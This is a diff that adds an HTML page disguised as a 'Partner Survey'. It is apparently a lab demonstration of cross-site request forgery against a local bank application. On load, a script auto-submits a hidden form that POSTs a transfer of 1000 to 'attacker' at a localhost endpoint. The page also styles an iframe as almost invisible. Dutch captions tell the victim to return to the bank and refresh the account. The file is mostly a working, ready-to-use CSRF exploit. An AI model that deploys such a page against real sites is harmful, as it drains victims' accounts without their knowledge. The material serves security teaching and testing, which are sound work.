@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Partner Survey</title>
+    <style>
+        body {
+            font-family: Arial;
+            max-width: 900px;
+            margin: 40px auto;
+        }
+
+        .card {
+            border: 1px solid #ddd;
+            padding: 16px;
+        }
+
+        iframe {
+            width: 100%;
+            height: 120px;
+            border: 0;
+            opacity: 0.01;
+        }
+
+        small {
+            color: #666;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Partner Survey</h1>
+    <div class="card">
+        <p>Bedankt om onze survey in te vullen. Je hoeft niets te doen, dit laadt
+            automatisch.</p>
+        <small>Deze pagina triggert op achtergrond een request naar de
+            bank.</small>
+        <!-- klassieke CSRF: auto-submit form naar kwetsbaar endpoint -->
+        <form id="csrf" action="http://localhost:8080/transfer" method="POST">
+            <input name="to" value="attacker">
+            <input name="amount" value="1000">
+        </form>
+        <script>
+            // Auto-submit zodra de pagina laadt
+            document.getElementById("csrf").submit();
+            console.log("CSRF submitted");
+        </script>
+    </div>
+    <p>Ga nu terug naar de bank en refresh de account info.</p>
+</body>
+
+</html>
